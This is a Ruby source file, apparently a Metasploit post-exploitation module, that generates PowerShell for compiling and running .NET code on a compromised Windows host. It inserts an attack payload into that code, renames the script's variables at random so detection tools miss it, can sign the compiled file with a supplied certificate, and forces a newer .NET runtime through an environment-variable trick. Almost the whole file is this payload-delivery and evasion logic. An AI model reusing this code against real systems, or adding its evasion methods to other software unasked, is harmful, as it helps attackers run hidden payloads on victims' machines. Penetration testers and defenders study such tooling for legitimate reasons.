# -*- coding: binary -*-
module Msf
class Post
module Windows

module Powershell
module DotNet

	def initialize(info = {})
		super
		register_advanced_options(
		[
			OptString.new('CERT_PATH', [false, 'Path on host to .pfx fomatted certificate for signing' ]),

		], self.class)
	end

	def dot_net_compiler(opts = {})
		#TODO: 
		# allow compilation entirely in memory with a b64 encoded product for export without disk access
		# Dynamically assign assemblies based on dot_net_code require/includes
		# 	Enumerate assemblies available to session, pull requirements, assign accordingly, pass to PS

		# Critical
		dot_net_code = opts[:harness]
		if ::File.file?(dot_net_code)
			dot_net_code = ::File.read(dot_net_code)
			#vprint_good("Read file in #{dot_net_code.encoding.name} encoding")
		end
		return if dot_net_code.nil? or dot_net_code.empty?

		# Ensure we're not running ASCII-8bit through powershell
		dot_net_code = dot_net_code.force_encoding('ASCII')

		# Optional
		provider = opts[:provider] || 'Microsoft.CSharp.CSharpCodeProvider' # This should also work with 'Microsoft.VisualBasic.VBCodeProvider'
		target = opts[:target] # Unless building assemblies in memory only
		certificate = opts[:cert] # PFX certificate path
		payload = opts[:payload]

		assemblies = ["mscorlib.dll", "System.dll", "System.Xml.dll", "System.Data.dll", "System.Net.dll"]
		if opts[:assemblies]
			opts[:assemblies] = opts[:assemblies].split(',').map {|a| agsub(/\s+/,'')} unless opts[:assemblies].is_a?(Array)
			assemblies += opts[:assemblies]
		end
		# 	# Read our code, attempt to find required assemblies
		# 	inc_var = provider == 'Microsoft.VisualBasic.VBCodeProvider' ? 'imports' : 'using'
		# 	assemblies =+ dot_net_code.split("\n").keep_if {|line| line =~ /^#{inc_var}.*;/i }.map do |dep| 
		# 		dep[dep.index(/\s/)+1..-2] + '.dll'
		# 	end
		# end
		assemblies = assemblies.uniq.compact

		compiler_opts = opts[:com_opts] || '/platform:x86 /optimize'


		if payload
			dot_net_code = dot_net_code.gsub('MSF_PAYLOAD_SPACE', payload)
		end

		var_gen_exe = target ? '$true' : '$false'

		# Obfu
		var_func = Rex::Text.rand_text_alpha(rand(8)+8)
		var_code = Rex::Text.rand_text_alpha(rand(8)+8)
		var_refs = Rex::Text.rand_text_alpha(rand(8)+8)
		var_provider = Rex::Text.rand_text_alpha(rand(8)+8)
		var_params = Rex::Text.rand_text_alpha(rand(8)+8)
		var_output = Rex::Text.rand_text_alpha(rand(8)+8)
		var_cert = Rex::Text.rand_text_alpha(rand(8)+8)

		compiler = <<EOS
function #{var_func} {
param (
[string[]] $#{var_code} 
, [string[]] $references = @()
)
$#{var_provider} = New-Object #{provider}
$#{var_params} = New-Object System.CodeDom.Compiler.CompilerParameters
@( "#{assemblies.join('", "')}", ([System.Reflection.Assembly]::GetAssembly( [PSObject] ).Location) ) | Sort -unique |% { $#{var_params}.ReferencedAssemblies.Add( $_ ) } | Out-Null
$#{var_params}.GenerateExecutable = #{var_gen_exe}
$#{var_params}.OutputAssembly = "#{target}"
$#{var_params}.GenerateInMemory   = $true
$#{var_params}.CompilerOptions = "#{compiler_opts}"
# $#{var_params}.IncludeDebugInformation = $true
$#{var_output} = $#{var_provider}.CompileAssemblyFromSource( $#{var_params}, $#{var_code} )
if ( $#{var_output}.Errors.Count -gt 0 ) {
$#{var_output}.Errors |% { Write-Error $_.ToString() }
} else { return $#{var_output}.CompiledAssembly}        
}
#{var_func} -#{var_code} @'

#{dot_net_code}

'@

EOS

		if certificate and target
			compiler += <<EOS
#{var_cert} = Get-PfxCertificate #{certificate}
Set-AuthenticodeSignature -Filepath #{target} -Cert #{var_cert}


EOS


		end
		# PS uses .NET 2.0 by default which doesnt work @ present (20120814, RLTM)
		# x86 targets also need to be compiled in x86 powershell instance
		run_32 = compiler_opts =~ /platform:x86/i ? true : false
		if opts[:net_clr] and opts[:net_clr] > 2 # PS before 3.0 natively uses NET 2
			return elevate_net_clr(compiler, run_32, opts[:net_clr]) 
		else
			return compiler
		end

	end

	def elevate_net_clr(ps_code, run_32 = false, net_ver = '4.0')
		var_func = Rex::Text.rand_text_alpha(rand(8)+8)
		var_conf_path = Rex::Text.rand_text_alpha(rand(8)+8)
		var_env_name = Rex::Text.rand_text_alpha(rand(8)+8)
		var_env_old = Rex::Text.rand_text_alpha(rand(8)+8)
		var_run32 = Rex::Text.rand_text_alpha(rand(8)+8)

		exec_wrapper = <<EOS
function #{var_func} {
[CmdletBinding()]
param (
[Parameter(Mandatory=$true)]
[ScriptBlock]
$ScriptBlock
)
$#{var_run32} = $#{run_32.to_s}
if ($PSVersionTable.CLRVersion.Major -eq #{net_ver.to_i}) {
Invoke-Command -ScriptBlock $ScriptBlock -ArgumentList $ArgumentList
return
}
$#{var_conf_path} = $Env:TEMP | Join-Path -ChildPath ([Guid]::NewGuid())
New-Item -Path $#{var_conf_path} -ItemType Container | Out-Null
@"
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
<startup useLegacyV2RuntimeActivationPolicy="true">
<supportedRuntime version="v#{net_ver.to_f}"/>
</startup>
</configuration>
"@ | Set-Content -Path $#{var_conf_path}/powershell.exe.activation_config -Encoding UTF8
$#{var_env_name} = 'COMPLUS_ApplicationMigrationRuntimeActivationConfigPath'
$#{var_env_old} = [Environment]::GetEnvironmentVariable($#{var_env_name})
[Environment]::SetEnvironmentVariable($#{var_env_name}, $#{var_conf_path})
try { if ($#{var_run32} -and [IntPtr]::size -eq 8 ) {
&"$env:windir\\syswow64\\windowspowershell\\v1.0\\powershell.exe" -inputformat text -command $ScriptBlock -noninteractive
} else {
&"$env:windir\\system32\\windowspowershell\\v1.0\\powershell.exe" -inputformat text -command $ScriptBlock -noninteractive
}} finally {
[Environment]::SetEnvironmentVariable($#{var_env_name}, $#{var_env_old})
$#{var_conf_path} | Remove-Item -Recurse
}
}
#{var_func} -ScriptBlock { 
#{ps_code}
}


EOS

	end

end; end; end; end; end
